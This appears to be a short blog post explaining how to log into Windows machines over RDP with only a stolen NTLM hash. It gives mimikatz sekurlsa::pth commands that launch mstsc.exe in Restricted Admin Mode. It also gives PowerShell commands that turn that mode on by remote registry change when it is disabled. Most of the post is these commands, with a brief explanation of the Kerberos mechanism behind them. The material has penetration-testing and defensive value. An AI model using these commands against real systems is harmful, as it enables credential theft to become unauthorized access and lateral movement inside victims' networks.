<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>MSTSC Pass The Hash</title>
</head><body><b>How does it work?</b><br/>
<br/>
Interestingly, it was quite easy to find out, so here is how to do it with mimikatz (youâ€™ll need local admin):<br/>
<br/>
sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:"mstsc.exe /restrictedadmin"<br/>
<br/>
This will open a new RDP window. If it still shows the user you are currently logged on with, just ignore it - everything will just work ;-)<br/>
<br/>
<br/>
<br/>
<b>Why does it work?</b><br/>
RDP <a href="https://blogs.technet.microsoft.com/kfalde/2013/08/14/restricted-admin-mode-for-rdp-in-windows-8-1-2012-r2/">Restricted Admin Mode</a>&nbsp;builds upon Kerberos. Taking a look at the network traffic, one can see that the RDP client requests a ticket on behalf of the impersonated user which is no problem since the hash is all we need to authenticate against Kerberos.<br/>
<br/>
<br/>
<b>Restricted Admin Mode is disabled, what can I do?</b><br/>
A registry key controls if a server accepts Restricted Admin sessions. If you have the NTLM hash of a user that has privileges to set registry keys, you can use for example Powershell to enable it and log in via RDP afterwards:<br/>
<br/>
mimikatz.exe "sekurlsa::pth /user:&lt;user name&gt; /domain:&lt;domain name&gt; /ntlm:&lt;the user's ntlm hash&gt; /run:powershell.exe"<br/>
<br/>
A new Powershell window will pop up:<br/>
Enter-PSSession -Computer &lt;Target&gt;<br/>
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force<br/>
<br/>
Now, your RDP should work fine.</body></html>